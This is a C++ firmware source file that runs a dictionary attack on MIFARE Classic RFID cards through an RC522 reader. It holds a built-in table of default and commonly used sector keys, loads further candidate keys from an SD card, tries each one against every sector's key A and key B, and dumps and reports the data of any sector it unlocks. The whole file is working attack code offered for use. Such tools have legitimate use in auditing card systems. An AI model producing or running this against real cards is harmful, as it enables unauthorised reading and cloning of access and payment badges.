#include "dictionary_attack.h"
#include "hal/card_comm.h"
#include "output/serial_reporter.h"
#include <SD.h>
#include <string.h>

static const uint8_t DICT[][KEY_SIZE] = {
    {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF},  // factory default
    {0xA0,0xA1,0xA2,0xA3,0xA4,0xA5}, // NXP default A
    {0xB0,0xB1,0xB2,0xB3,0xB4,0xB5}, // NXP default B
    {0x00,0x00,0x00,0x00,0x00,0x00}, // zero key
    {0xD3,0xF7,0xD3,0xF7,0xD3,0xF7}, // NDEF
    {0x4D,0x3A,0x99,0xC3,0x51,0xDD},
    {0x1A,0x98,0x2C,0x7E,0x45,0x9A},
    {0xAA,0xBB,0xCC,0xDD,0xEE,0xFF},
    {0x71,0x4C,0x5C,0x88,0x6E,0x97},
    {0x58,0x7E,0xE5,0xF9,0x35,0x0F},
    {0xA0,0x47,0x8C,0xC3,0x90,0x91},
    {0x53,0x3C,0xB6,0xC7,0x23,0xF6},
    {0x8F,0xD0,0xA4,0xF2,0x56,0xE9},
    {0x6C,0x77,0x85,0x28,0x63,0xD7},
    {0x28,0x63,0xD7,0x6C,0x77,0x85},
    {0xAB,0xCD,0xEF,0x12,0x34,0x56},
    {0x12,0x34,0x56,0x78,0x9A,0xBC},
    {0x11,0x22,0x33,0x44,0x55,0x66},
    {0x01,0x02,0x03,0x04,0x05,0x06},
    {0x13,0x37,0x13,0x37,0x13,0x37},
    {0xDE,0xAD,0xBE,0xEF,0x12,0x34},
};
static const uint16_t DICT_SIZE = sizeof(DICT)/sizeof(DICT[0]);

static bool _tryKey(CardDump* dump, uint8_t sector, bool isA, const uint8_t* key) {
    uint8_t atqa[2];
    if (picc_wakeupA(atqa) != RC522_OK) return false;
    if (picc_anticollision(&dump->uid) != RC522_OK) return false;
    uint8_t cmd     = isA ? MF_AUTH_KEY_A : MF_AUTH_KEY_B;
    uint8_t trailer = ks_sectorToTrailer(sector);
    RC522Status s   = picc_mfAuth(cmd, trailer, key, &dump->uid);
    picc_mfDeauth();
    return s == RC522_OK;
}

static void _readSector(CardDump* dump, uint8_t sector) {
    bool isA = ks_hasKeyA(dump, sector);
    uint8_t cmd     = isA ? MF_AUTH_KEY_A : MF_AUTH_KEY_B;
    const uint8_t* k = isA ? dump->sectors[sector].keyA : dump->sectors[sector].keyB;
    uint8_t atqa[2];
    if (picc_wakeupA(atqa) != RC522_OK) return;
    if (picc_anticollision(&dump->uid) != RC522_OK) return;
    if (picc_mfAuth(cmd, ks_sectorToTrailer(sector), k, &dump->uid) != RC522_OK) return;
    uint8_t first = ks_sectorToFirstBlock(sector);
    for (uint8_t b = 0; b < BLOCKS_PER_SECTOR; b++) {
        uint8_t buf[16];
        if (picc_mfRead(first+b, buf) == RC522_OK) {
            ks_storeBlockData(dump, sector, b, buf);
            reporter_dataRead(sector, b, buf);
        }
    }
    picc_mfDeauth();
}

uint8_t dictAttack_run(CardDump* dump) {
    uint8_t total = 0;
    for (uint8_t sector = 0; sector < dump->totalSectors; sector++) {
        for (int8_t kt = 1; kt >= 0; kt--) {
            bool isA = (kt == 1);
            if (isA && ks_hasKeyA(dump, sector)) continue;
            if (!isA && ks_hasKeyB(dump, sector)) continue;
            reporter_attackStart("dictionary", sector, isA);
            bool found = false;
            // 1. built-in dictionary
            for (uint16_t i = 0; i < DICT_SIZE && !found; i++) {
                if (_tryKey(dump, sector, isA, DICT[i])) {
                    if (isA) ks_setKeyA(dump, sector, DICT[i]);
                    else     ks_setKeyB(dump, sector, DICT[i]);
                    reporter_keyFound(sector, isA, DICT[i], "dictionary_builtin");
                    total++; found = true;
                }
            }
            // 2. SD card keys.txt (one key per line, 12 hex chars, e.g. "FFFFFFFFFFFF")
            if (!found) {
                File f = SD.open(DICT_PATH);
                if (f) {
                    char line[16];
                    while (f.available() && !found) {
                        uint8_t len = 0;
                        while (f.available() && len < 14) {
                            char c = (char)f.read();
                            if (c == '\n' || c == '\r') break;
                            line[len++] = c;
                        }
                        line[len] = '\0';
                        if (len < 12) continue;
                        uint8_t key[6]; bool ok = true;
                        for (uint8_t j = 0; j < 6 && ok; j++) {
                            auto hv = [](char c) -> int8_t {
                                if (c>='0'&&c<='9') return c-'0';
                                if (c>='a'&&c<='f') return c-'a'+10;
                                if (c>='A'&&c<='F') return c-'A'+10;
                                return -1;
                            };
                            int8_t h = hv(line[j*2]), l = hv(line[j*2+1]);
                            if (h<0||l<0) { ok=false; break; }
                            key[j] = (uint8_t)((h<<4)|l);
                        }
                        if (ok && _tryKey(dump, sector, isA, key)) {
                            if (isA) ks_setKeyA(dump, sector, key);
                            else     ks_setKeyB(dump, sector, key);
                            reporter_keyFound(sector, isA, key, "dictionary_sd");
                            total++; found = true;
                        }
                    }
                    f.close();
                }
            }
            if (!found) { ks_markFailed(dump, sector, isA); reporter_keyFailed(sector, isA); }
        }
        if (ks_isSectorKnown(dump, sector)) _readSector(dump, sector);
    }
    return total;
}
